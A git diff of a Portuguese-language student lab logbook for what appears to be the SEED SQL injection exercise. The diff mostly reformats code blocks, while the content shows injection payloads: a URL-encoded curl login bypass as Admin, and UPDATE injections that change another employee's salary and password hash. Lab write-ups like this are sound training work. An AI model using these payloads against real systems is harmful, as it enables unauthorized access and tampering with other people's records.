@@ -70,9 +70,13 @@ WHERE name= ’Admin'#’ and Password=’$hashed_pwd’
 
 > Nesta tarefa temos o objetivo de repetir a tarefa 2.1 mas agora através da linha de comandos. Para isso vamos utilizar o comando 'curl' para fazer um pedido GET. <br>
 > Foi nos dado este exemplo: <br>
-```  $ curl ’www.seed-server.com/unsafe_home.php?username=alice&Password=11’  ``` 
+```  
+$ curl ’www.seed-server.com/unsafe_home.php?username=alice&Password=11’  
+``` 
 > e ainda nos foi avisado que devemos tratar dos caracteres especiais de forma diferente. Podemos adaptar isso e criar outro comando malicioso. Começamos por cifrar os caracteres especiais, usamos o %27 que representa ' e o %23 que representa #: <br>
-```$ curl "www.seed-server.com/unsafe_home.php?username=Admin%27%3&Password=" ```
+```
+$ curl "www.seed-server.com/unsafe_home.php?username=Admin%27%3&Password=" 
+```
 
 >![](images/LOGBOOK8_4.png)
 
@@ -128,7 +132,8 @@ PhoneNumber=’911111111’,Salary='90000' WHERE ID=$id;
 > Conseguimos fazer isso de forma rápida se fizermos um novo WHERE e comentarmos o anterior. Algo deste género: <br>
 
 ```sql
-911111111', Salary='1' WHERE Name = 'Boby';# ```
+911111111', Salary='1' WHERE Name = 'Boby';# 
+```
 
 > e o resultado fica assim:
 
@@ -142,8 +147,11 @@ PhoneNumber=’911111111', Salary='1' WHERE Name = 'Boby';# WHERE ID=$id;
 ```
 
 > Para vermos isto vamos à shell e corremos: <br>
+
 ```sql
-SELECT Salary FROM credential WHERE Name='Boby';```
+SELECT Salary FROM credential WHERE Name='Boby';
+```
+
 > Antes e depois:
 
 >![](images/LOGBOOK8_8.png)
@@ -154,7 +162,9 @@ SELECT Salary FROM credential WHERE Name='Boby';```
 > Analisamos o código fornecido em unsafe_edit_backend.php e verificamos que a forma como protegem a palavra passe é com criptografia SHA1. Por isso, para trocarmos a palavra passe para "jafoste" colocamos primeiro em hash "2e2a6402737a5e73c6baad2545f634d6be68d4ba". <br>
 
 ```sql
-911111111', Password='2e2a6402737a5e73c6baad2545f634d6be68d4ba' WHERE Name = 'Boby';#```
+911111111', Password='2e2a6402737a5e73c6baad2545f634d6be68d4ba' WHERE Name = 'Boby';#
+
+```
 
 > e o resultado fica assim: <br>
 
@@ -164,7 +174,8 @@ nickname='$input_nickname',
 email='$input_email',
 address='$input_address',
 Password=’$hashed_pwd’,
-PhoneNumber=’911111111', Password='2e2a6402737a5e73c6baad2545f634d6be68d4ba' WHERE Name = 'Boby';# WHERE ID=$id;```
+PhoneNumber=’911111111', Password='2e2a6402737a5e73c6baad2545f634d6be68d4ba' WHERE Name = 'Boby';# WHERE ID=$id;
+```
 
 >![](images/LOGBOOK8_9.png)
 
